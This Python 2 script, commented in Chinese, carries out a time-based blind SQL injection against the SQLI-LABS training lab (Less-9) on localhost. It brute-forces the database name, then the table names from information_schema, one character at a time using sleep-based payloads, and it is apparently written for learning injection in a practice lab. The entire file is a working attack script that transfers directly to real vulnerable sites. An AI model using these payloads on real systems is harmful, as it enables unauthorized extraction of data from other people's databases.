# -*- coding: utf-8 -*-

import time
import requests

# 创建list
guess = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456890_.<>?;!$#{}"
dictionary = list(guess)

# 获得url
main_url = "http://localhost:81/SQLI-LABS/sqli-labs-master/Less-9/?id=1'"

# 爆数据库名
def get_database():
    print "Start to retrieve the database_name: "
    database = "database: "
    for i in range(1,9):
        for key in dictionary:
            url = main_url + " and if(ord(substr(database()," + str(i) + ",1)) = " + str(ord(key)) + " , sleep(5), 1) --+"
            start_time=time.time()
            html=requests.get(url)
            if (time.time() - start_time > 4 ):
                database=database + key
                print database


# 爆数据库
def get_tables():
    print "Start to retrieve the tables: "
    tables = "tables: "
    for j in range(1,20):
        for key in dictionary:
            url = main_url + " and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),"+ str(j) +" ,1)) = " + str(ord(key)) + ", sleep(5), 1) --+"
            start_time=time.time()
            html=requests.get(url)
            if (time.time() - start_time > 3):
                tables = tables + key
                print tables


# get_database()
get_tables()